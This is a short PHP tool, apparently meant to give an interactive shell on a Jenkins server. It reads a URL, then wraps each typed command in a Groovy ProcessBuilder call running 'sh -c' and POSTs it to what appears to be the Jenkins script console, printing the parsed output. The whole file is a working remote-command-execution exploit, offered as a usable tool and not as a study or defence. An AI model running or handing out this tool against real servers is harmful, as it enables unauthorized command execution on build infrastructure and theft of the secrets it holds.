<?php

require 'jenkins.php';
require 'simple_html_dom.php';

$url = readline("URL : ");

while (true) {
	$cmd = readline("Command : ");
	executeCmd($url, $cmd);
}

function parseResult($content) {
    $html = str_get_html($content);
    $preTags = $html->find("pre");
    if(isset($preTags[1])) {
        echo "Result : \n" . $preTags[1]->plaintext . "\n";
    } else {
        echo "Result : Windows probably\n\n";
    }   
}

function executeCmd($url, $cmd)
{
    $script = "println new ProcessBuilder('sh','-c','" . $cmd . "').redirectErrorStream(true).start().text";
    echo "$script\n\n";
    $fields = array('script' => urlencode($script), 'Submit' => 'Run');
    $fields_string = "";
    foreach ($fields as $key => $value) {
        $fields_string .= $key . '=' . $value . '&';
    }
    rtrim($fields_string, '&');

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
    curl_setopt($ch, CURLOPT_POST, count($fields));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
    $result = curl_exec($ch);
    curl_close($ch);
    parseResult($result);
}